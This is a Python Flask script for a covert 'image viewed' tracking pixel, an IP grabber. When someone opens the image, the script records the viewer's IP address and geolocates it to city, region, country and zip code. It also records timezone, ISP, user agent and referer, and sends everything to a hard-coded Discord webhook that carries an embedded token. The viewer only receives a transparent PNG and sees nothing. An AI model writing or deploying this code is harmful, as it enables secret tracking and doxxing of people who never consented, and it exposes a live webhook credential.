from flask import Flask, request, send_file
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1385037922855682068/kgfhnHmxIVDLG-LNFej8liMtrrbyju6JqmrpI8ddaOoG8vzE0aoOa1aOQ716SUhBCswq"

@app.route("/track/<image_id>.png")
def track(image_id):
    # Get real IP
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if "," in ip:
        ip = ip.split(",")[0].strip()

    # Geolocation
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
        if geo.get("status") == "success":
            location = f"{geo.get('city', 'N/A')}, {geo.get('regionName', 'N/A')}, {geo.get('country', 'N/A')} ({geo.get('zip', '')})"
            timezone = geo.get("timezone", "N/A")
            isp = geo.get("isp", "N/A")
        else:
            location = timezone = isp = "Unavailable"
    except:
        location = timezone = isp = "Error"

    # Headers
    ua = request.headers.get("User-Agent", "Unknown")
    referer = request.headers.get("Referer", "None")

    # Send to webhook
    embed = {
        "title": "🖼️ Image Viewed",
        "description": f"Tracking ID: `{image_id}`",
        "color": 0xff6600,
        "fields": [
            {"name": "IP", "value": ip},
            {"name": "Location", "value": location},
            {"name": "Timezone", "value": timezone},
            {"name": "ISP", "value": isp},
            {"name": "User Agent", "value": ua, "inline": False},
            {"name": "Referer", "value": referer}
        ]
    }

    requests.post(WEBHOOK_URL, json={"embeds": [embed]})

    # Return transparent PNG
    return send_file("dot.png", mimetype="image/png")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
